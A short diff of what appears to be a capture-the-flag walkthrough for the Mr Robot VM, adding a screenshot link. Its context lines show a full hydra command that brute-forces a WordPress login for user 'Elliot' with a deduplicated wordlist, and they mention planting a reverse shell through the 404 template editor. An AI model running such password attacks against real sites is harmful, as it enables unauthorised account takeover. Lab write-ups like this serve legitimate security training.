@@ -38,6 +38,8 @@ In order to get the password for the user "Elliot" I used hydra to bruteforce at
 To make the attack faster and more efficient I used command ```sort /home/kali/mrrobot/fsocity.dic | uniq > ufsocity.txt``` 
 ### The Attack (hydra)
 Used command ``` sudo hydra -vv -l Elliot -P  ufsocity.txt 192.168.1.8 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is Incorrect' ``` to crack the password successfully.
+![Hydra Cracking Success](./image/hydra password crack.png)
+
 
 ## Reverse Shell
 After successfully logged into the website then I navigated to Appearance > Editor and selected the 404 Template since its easy to trigger. 
